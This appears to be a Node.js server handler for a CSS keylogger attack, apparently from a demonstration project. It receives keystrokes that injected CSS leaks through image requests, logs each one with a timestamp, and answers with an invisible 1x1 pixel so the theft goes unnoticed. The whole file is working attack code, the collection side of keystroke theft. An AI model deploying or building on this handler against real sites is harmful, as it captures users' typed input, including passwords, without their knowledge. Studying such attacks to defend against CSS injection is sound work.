const loggedKeys = require("./loggedKeys");

const cssKeyLoggerAddKeyHandler = async (req, res) => {
  // push the recent key stroke to logs
  const key = req.query.val;
  const time = new Date().getTime();

  // for simplicity I don't want to record too many inputs
  if (loggedKeys.length > 30) {
    loggedKeys.splice(0, loggedKeys.length);
  }
  loggedKeys.push({ time, key });

  // transparent 1x1 pixel
  const imgData =
    "data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==";
  const base64Data = imgData.replace(/^data:image\/gif;base64,/, "");
  const img = Buffer.from(base64Data, "base64");

  res.writeHead(200, {
    "Content-Type": "image/png",
    "Content-Length": img.length,
  });
  res.end(img);
};

module.exports = cssKeyLoggerAddKeyHandler;
